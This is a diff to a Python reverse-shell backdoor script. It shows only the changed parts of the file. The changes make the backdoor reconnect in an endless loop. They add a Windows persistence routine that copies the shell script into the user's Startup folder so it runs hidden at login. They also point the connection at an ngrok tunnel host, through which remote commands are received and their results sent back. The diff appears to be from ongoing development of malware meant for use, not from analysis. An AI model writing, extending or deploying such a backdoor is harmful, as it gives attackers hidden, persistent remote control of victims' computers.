@@ -3,23 +3,33 @@ import json
 import subprocess
 import os
 import base64
+import sys
+import shutil
 
 class Backdoor:
     def __init__(self, target, port):
         self.port = port
         self.target = target
-        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection = None
 
     def connect(self):
-        try:
-            self.connection.connect((self.target, self.port))
-            print("[+] Connected to the target.")
-        except ConnectionRefusedError:
-            print("[-] Connection refused. Make sure the server is running.")
-            exit(1)
-        except Exception as e:
-            print(f"[-] Connection failed: {e}")
-            exit(1)
+        while True:
+            try:
+                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.connection.connect((self.target, self.port))
+                print("[+] Connected to the target.")
+                break
+            except ConnectionRefusedError:
+                print("[-] Connection refused. Make sure the server is running.")
+                self.reconnect()
+            except Exception as e:
+                print(f"[-] Connection failed: {e}")
+                self.reconnect()
+
+    def reconnect(self):
+        self.connection.close()
+        self.connection = None
+        self.connect()
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -98,6 +108,22 @@ class Backdoor:
             print(command_result)
             self.reliable_send(command_result)
 
-my_backdoor = Backdoor("0.tcp.eu.ngrok.io", 1337)
-#my_backdoor = Backdoor("LHOST", 1337)
-my_backdoor.run()
+### only for Windows, Unix inc soon ###
+def persistence():
+    script_path = "C:\\Users\\$PATH\\get_shell.py"
+    startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+    startup_file = os.path.join(startup_dir, "get_shell.pyw")
+
+    if not os.path.isfile(startup_file) or os.stat(script_path).st_mtime > os.stat(startup_file).st_mtime:
+        # copy get_shell script to the startup directory
+        shutil.copyfile(script_path, startup_file)
+
+def main():
+    target = "5.tcp.eu.ngrok.io"
+    port = 1337
+    my_backdoor = Backdoor(target, port)
+    persistence()
+    my_backdoor.run()
+
+if __name__ == "__main__":
+    main()
